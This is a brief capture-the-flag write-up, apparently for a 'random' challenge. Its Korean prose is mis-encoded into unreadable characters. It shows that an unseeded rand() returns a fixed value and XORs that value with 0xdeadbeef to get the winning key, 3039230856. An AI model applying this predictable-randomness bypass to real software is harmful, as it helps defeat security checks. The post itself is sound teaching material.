random = rand()ë¡œ ëœë¤ ê°’ì´ ë“¤ì–´ê°€ëŠ” ê²ƒì´ ì•„ë‹Œ, ì¼ì •í•œ ê°’(1804289383)ì´ ë“¤ì–´ê°€ê²Œ ëœë‹¤.

ë”°ë¼ì„œ ìš°ë¦¬ëŠ” **key ^ random == 0xdeadbeef**ë¥¼ ë§Œì¡±í•˜ë„ë¡ key ê°’ì„ ì£¼ë©´ ëœë‹¤.

key xor random = 0xdeadbeef -> key = 0xdeadbeef xor random 
ì´ê¸° ë•Œë¬¸ì— í‚¤ ê°’ì„ êµ¬í•  ìˆ˜ ìˆë‹¤.

1804289383 -> 0x6b8b4567

![image](https://user-images.githubusercontent.com/33647663/169638667-eae9aeec-c2e1-469c-9b96-6f43a75fc9ca.png)

ë”°ë¼ì„œ í”„ë¡œê·¸ë¨ì„ ì‹¤í–‰í•˜ê³  key ê°’ìœ¼ë¡œ 3039230856(0xb526fb88)ì„ ì…ë ¥í•´ì£¼ë©´ í’€ ìˆ˜ ìˆë‹¤.


![image](https://user-images.githubusercontent.com/33647663/169638721-c5653301-21bc-4c1a-9531-ed588e646543.png)
